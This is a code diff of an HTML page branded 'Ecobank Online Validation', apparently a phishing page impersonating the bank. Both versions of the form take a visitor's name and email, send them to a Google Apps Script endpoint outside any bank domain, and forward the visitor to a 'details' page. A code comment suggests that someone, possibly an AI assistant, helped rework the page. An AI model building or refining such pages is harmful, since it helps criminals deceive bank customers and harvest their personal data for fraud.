@@ -1,136 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Ecobank Online Validation</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: linear-gradient(to bottom, #08143a, #0b1d4d);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      color: #fff;
-      overflow-x: hidden;
-      min-height: 100vh;
-    }
-
-    .header {
-      position: relative;
-      background: linear-gradient(135deg, #2b6cb0, #2a4365);
-      width: 100%;
-      min-height: 180px;
-      padding: 40px 20px;
-      border-bottom-left-radius: 40px;
-      border-bottom-right-radius: 40px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-    }
-
-    .header-content h1 {
-      margin: 0;
-      font-size: 22px;
-      color: #fff;
-    }
-
-    .header-content p {
-      margin: 5px 0 0;
-      font-size: 14px;
-      color: #e0e0e0;
-    }
-
-    .form-container {
-      background: rgba(255, 255, 255, 0.1);
-      width: 90%;
-      max-width: 360px;
-      margin-top: -30px;
-      padding: 30px 25px;
-      border-radius: 12px;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-      backdrop-filter: blur(4px);
-    }
-
-    label {
-      display: block;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #fff;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: none;
-      border-radius: 6px;
-      font-size: 14px;
-      background-color: #fff;
-      color: #000;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      background: #00a859;
-      color: #fff;
-      transition: all 0.3s ease;
-    }
-
-    button:hover {
-      background: #008f4a;
-      transform: scale(1.03);
-    }
-
-    .processing-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(6px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-size: 20px;
-      font-weight: bold;
-      z-index: 999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s ease;
-    }
-
-    .processing-overlay.active {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .spinner {
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 0.8s linear infinite;
-      margin-right: 10px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
+    body{font-family:Arial, sans-serif;margin:0;background:linear-gradient(to bottom,#08143a,#0b1d4d);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center}
+    .header{position:relative;background:linear-gradient(135deg,#2b6cb0,#2a4365);width:100%;min-height:160px;padding:36px 16px;border-bottom-left-radius:40px;border-bottom-right-radius:40px;display:flex;justify-content:center;align-items:center;text-align:center}
+    .header-content h1{margin:0;font-size:22px;color:#fff}
+    .header-content p{margin:6px 0 0;color:#e0e0e0}
+    .form-wrap{width:90%;max-width:380px;margin-top:-28px;padding:28px;border-radius:12px;background:rgba(255,255,255,0.06);box-shadow:0 6px 16px rgba(0,0,0,0.4);backdrop-filter:blur(4px)}
+    label{display:block;margin-bottom:6px;font-size:14px;color:#fff}
+    input{width:100%;padding:12px;margin-bottom:18px;border-radius:6px;border:1px solid #ccc;background:#fff;color:#000;font-size:14px;box-sizing:border-box}
+    button{width:100%;padding:12px;border-radius:6px;border:none;background:#00A859;color:#fff;font-weight:700;cursor:pointer;font-size:16px}
+    button:hover{background:#008f4a;transform:scale(1.02)}
+    .processing-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px;z-index:999;opacity:0;pointer-events:none;transition:opacity .2s}
+    .processing-overlay.active{opacity:1;pointer-events:auto}
+    .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.35);border-top:3px solid #fff;border-radius:50%;margin-right:10px;animation:spin .9s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
@@ -141,72 +28,78 @@
     </div>
   </div>
 
-  <div class="form-container" id="formContainer">
-    <form id="dataForm">
-      <label>First Name</label>
-      <input type="text" name="firstName" placeholder="Enter your first name" required>
+  <div class="form-wrap" id="formContainer">
+    <form id="dataForm" autocomplete="off">
+      <label for="firstName">First Name</label>
+      <input id="firstName" name="firstName" type="text" placeholder="Enter your first name" required>
 
-      <label>Last Name</label>
-      <input type="text" name="lastName" placeholder="Enter your last name" required>
+      <label for="lastName">Last Name</label>
+      <input id="lastName" name="lastName" type="text" placeholder="Enter your last name" required>
 
-      <label>Email</label>
-      <input type="email" name="email" placeholder="Enter your email address" required>
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="Enter your email address" required>
 
       <button type="submit">CONTINUE →</button>
     </form>
   </div>
 
-  <div class="processing-overlay" id="processingOverlay">
-    <div class="spinner"></div> Processing…
+  <div class="processing-overlay" id="processingOverlay" aria-hidden="true">
+    <div style="display:flex;align-items:center">
+      <div class="spinner" aria-hidden="true"></div>
+      Processing…
+    </div>
   </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbyf0ua24YeOGAcrQlCWZ8txX0eIQnNT-UQPl_3Z1aBclFy1PNWkq7fOKnSLSO1lVr2b/exec";
-    const form = document.getElementById("dataForm");
-    const overlay = document.getElementById("processingOverlay");
-    const formContainer = document.getElementById("formContainer");
+    // YOUR deployed web app URL (the one you shared)
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
 
-    form.addEventListener("submit", async (e) => {
+    const form = document.getElementById('dataForm');
+    const overlay = document.getElementById('processingOverlay');
+    const formContainer = document.getElementById('formContainer');
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      overlay.classList.add("active");
-      formContainer.style.filter = "blur(4px)";
+      overlay.classList.add('active');
+      formContainer.style.filter = 'blur(3px)';
 
-      const formData = new FormData(form);
-      const firstName = formData.get("firstName");
-      const lastName = formData.get("lastName");
-      const email = formData.get("email");
+      const fd = new FormData(form);
+      const firstName = fd.get('firstName');
+      const lastName = fd.get('lastName');
+      const email = fd.get('email');
 
       try {
-        const response = await fetch(scriptURL, { method: "POST", body: formData });
-        const textResult = await response.text();
+        const res = await fetch(scriptURL, { method: 'POST', body: fd });
+        const text = await res.text();
 
-        let parsed;
-        try { parsed = JSON.parse(textResult); } catch(e) {}
+        // Try parsing JSON if script returns JSON
+        let parsed = null;
+        try { parsed = JSON.parse(text); } catch (_) {}
 
         setTimeout(() => {
-          overlay.classList.remove("active");
-          formContainer.style.filter = "none";
+          overlay.classList.remove('active');
+          formContainer.style.filter = 'none';
 
-          // ✅ Check for success
-          if (
-            textResult.includes("Success") ||
-            (parsed && parsed.result && parsed.result.toLowerCase() === "success")
-          ) {
-            // ✅ Store user data
-            localStorage.setItem("firstName", firstName);
-            localStorage.setItem("lastName", lastName);
-            localStorage.setItem("email", email);
+          const ok = text.includes("Success") || (parsed && parsed.result && parsed.result.toLowerCase() === "success");
+          if (ok) {
+            // store for details page
+            try {
+              localStorage.setItem('firstName', firstName || '');
+              localStorage.setItem('lastName', lastName || '');
+              localStorage.setItem('email', email || '');
+            } catch (_) {}
 
-            // ✅ Redirect to details page
-            window.location.href = "details.html";
+            window.location.href = 'details.html';
           } else {
-            alert("Submission failed: " + textResult);
+            alert('Submission failed: ' + text);
           }
-        }, 1000);
+        }, 700);
+
       } catch (err) {
-        overlay.classList.remove("active");
-        formContainer.style.filter = "none";
-        alert("Network error. Please try again.");
+        overlay.classList.remove('active');
+        formContainer.style.filter = 'none';
+        console.error(err);
+        alert('Network error. Please try again.');
       }
     });
   </script>
